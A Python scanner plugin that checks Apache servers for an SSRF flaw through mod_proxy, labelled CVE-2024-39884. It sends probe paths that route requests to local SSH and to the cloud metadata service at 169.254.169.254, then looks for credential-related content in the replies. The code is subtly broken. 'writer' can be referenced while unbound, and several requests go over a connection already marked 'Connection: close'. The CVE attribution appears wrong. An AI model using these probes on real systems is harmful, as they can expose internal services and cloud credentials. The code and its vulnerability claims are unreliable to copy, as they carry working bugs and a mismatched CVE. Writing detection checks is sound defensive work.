import asyncio
import ssl
from plugins import NaslPlugin, PluginResult

class ApacheModProxySSRF39884(NaslPlugin):
    PLUGIN_ID = 1265
    NAME = "Apache HTTP Server mod_proxy SSRF (CVE-2024-39884)"
    FAMILY = "Web Servers"
    CVSS_SCORE = 7.5
    DESCRIPTION = "Apache HTTP Server mod_proxy module is vulnerable to a Server-Side Request Forgery attack through crafted HTTP requests, allowing an attacker to make requests to internal systems."
    SOLUTION = "Upgrade Apache HTTP Server to the latest version containing the fix for CVE-2024-39884. Review mod_proxy configuration."
    CVE = ["CVE-2024-39884"]
    PORTS = [80, 443, 8080, 8443]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = "https" if port_to_check in (443, 8443) else "http"
                ctx = None
                if scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5
                )
                host_header = target
                if target in ("127.0.0.1", "localhost", "::1"):
                    host_header = "alieninc.tech"
                test_paths = [
                    "/proxy/http://127.0.0.1:22/",
                    "/proxy/http://169.254.169.254/latest/meta-data/",
                    "/proxy/",
                ]
                for path in test_paths:
                    request = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {host_header}\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    )
                    writer.write(request.encode())
                    await writer.drain()
                    response = b""
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=5)
                        if not chunk:
                            break
                        response += chunk
                    decoded = response.decode("utf-8", errors="replace")
                    headers_part = decoded.split("\r\n\r\n", 1)[0] if "\r\n\r\n" in decoded else ""
                    status_line = headers_part.split("\r\n")[0] if headers_part else ""
                    status_code = 0
                    if len(status_line.split(" ")) >= 2:
                        try:
                            status_code = int(status_line.split(" ")[1])
                        except ValueError:
                            pass
                    body = decoded.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in decoded else ""
                    if status_code in (200, 301, 302, 502, 504):
                        if "SSH" in body or "OpenSSH" in body:
                            results.append(PluginResult(
                                vulnerable=True,
                                target=target,
                                port=port_to_check,
                                cvss_score=self.CVSS_SCORE,
                                severity=self.severity_from_cvss(self.CVSS_SCORE),
                                description=self.DESCRIPTION,
                                solution=self.SOLUTION,
                                evidence=f"mod_proxy SSRF confirmed! Accessed internal service via {path}",
                                references=self.CVE
                            ))
                            break
                        if "iam" in body.lower() or "security-credentials" in body.lower():
                            results.append(PluginResult(
                                vulnerable=True,
                                target=target,
                                port=port_to_check,
                                cvss_score=9.8,
                                severity="critical",
                                description="Apache mod_proxy SSRF with cloud metadata access",
                                solution=self.SOLUTION,
                                evidence=f"Cloud metadata accessed via SSRF at {path}",
                                references=self.CVE
                            ))
                            break
                        if status_code in (301, 302) and path.startswith("/proxy/http"):
                            location = ""
                            for line in headers_part.split("\r\n"):
                                if line.lower().startswith("location:"):
                                    location = line.split(":", 1)[1].strip()
                                    break
                            if any(location.startswith(p) for p in ["http://127.", "http://10.", "http://172.", "http://192.168"]):
                                results.append(PluginResult(
                                    vulnerable=True,
                                    target=target,
                                    port=port_to_check,
                                    cvss_score=self.CVSS_SCORE,
                                    severity=self.severity_from_cvss(self.CVSS_SCORE),
                                    description=self.DESCRIPTION,
                                    solution=self.SOLUTION,
                                    evidence=f"mod_proxy SSRF via redirect to internal: {location}",
                                    references=self.CVE
                                ))
                                break
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                continue
            finally:
                if writer:
                    writer.close()
                    await writer.wait_closed()
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description="No issues detected"))
        return results
